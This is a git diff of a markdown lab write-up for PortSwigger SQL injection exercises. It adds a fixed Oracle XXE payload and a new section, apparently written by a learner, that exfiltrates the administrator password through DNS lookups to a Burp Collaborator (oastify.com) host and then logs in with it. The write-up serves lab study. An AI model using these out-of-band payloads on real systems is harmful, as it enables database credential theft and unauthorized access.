@@ -572,6 +572,8 @@ The above did not work. However, eventually I tried:
 
 Which incurred a 10-second delay before getting the response from the server. This also means that the underlying DB was PostgreSQL.
 
+<img src="./img/sleep/sleep-test.png" width=400>
+
 Upon checking the lab status, it was indeed finished. So, lab complete!
 
 ---
@@ -631,7 +633,7 @@ For this, I had to refer to the cheatsheet prepared by PortSwigger for forced DN
 
 > **Oracle** (patched)
 > ```sql
-> SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://> BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+> SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
 > ```
 > 
 > **Oracle** (unpatched, requires elevated privileges)
@@ -703,3 +705,44 @@ Once a response was received, I can check back on Collaborator to see what sort 
 As seen, Collaborator received a total of four DNS-related interactions from the lab application. What's interesting is that the subdomain of the Collaborator host is noted down as "payload," which could mean that we'll use the subdomain to exfiltrate information in the future.
 
 But for now, lab complete!
+
+## 17. Blind SQL injection with out-of-band data exfiltration
+<img src="./img/xxe-exfil/xxe-exfil.png" width=400>
+
+### Description
+A slightly modified version of [16](#16-blind-sql-injection-with-out-of-band-interaction). The lab conditions are the same:
+> - The application not expose any query responses.
+> - The application not expose any query errors.
+> - The application does not expose any time delays as the requests are performed asynchronously.
+
+The only difference is that we must now exfiltrate the details of the `administrator` account.
+
+### Solution
+First, we will modify the XML payload from [16](#16-blind-sql-injection-with-out-of-band-interaction):
+> ```xml
+> <?xml version="1.0" encoding="UTF-8"?>
+> <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>
+> >>>
+> <?xml version="1.0" encoding="UTF-8"?>
+> <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{password}.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>
+> ```
+I needed to somehow manipulate the database into evaluating `{password}` and inserting it as a subdomain of the Collaborator host. This way, we'll be able to see it as the domain name the application tried to access inside Collaborator's logs.
+
+Luckily, the union operator `||` in SQL is rather versatile, and can be used for exactly this purpose:
+> ```sql
+> ... [ <!ENTITY % remote SYSTEM "http://6iptfgy34wkbg3nzgljo5hykjbp2dw1l.oastify.com/"> %remote;]> ...
+> >>>
+> ... [ <!ENTITY % remote SYSTEM "http://' || (SELECT password FROM users WHERE username='administrator') || '.6iptfgy34wkbg3nzgljo5hykjbp2dw1l.oastify.com/"> %remote;]> ...
+> ```
+
+This will result in SQL evaluating the value of the subquery in the middle, which will be the password, and the extra dot before the generated subdomain will connect it to the URL string, causing it to be sent in the DNS lookup. Upon checking collaborator, I found the following:
+
+<img src="./img/xxe-exfil/xxe-exfil-collab.png" width=400>
+<img src="./img/xxe-exfil/xxe-exfil-pwd.png" width=400>
+
+As seen, the application tried to look up the following host:
+> `yqwnkhh5zxvwbj4g3dl6.mb198wrjxcdr9jgf91c4yxr0crii6hu6.oastify.com`
+
+From [16](#16-blind-sql-injection-with-out-of-band-interaction), we can see that the subdomain `yqwnkhh5zxvwbj4g3dl6` did not exist before, which means that this is indeed the password of the `administrator` account that we have attached above as a subdomain.
+
+I attempted to log in with the details.. and it worked! Lab complete! One more to go!
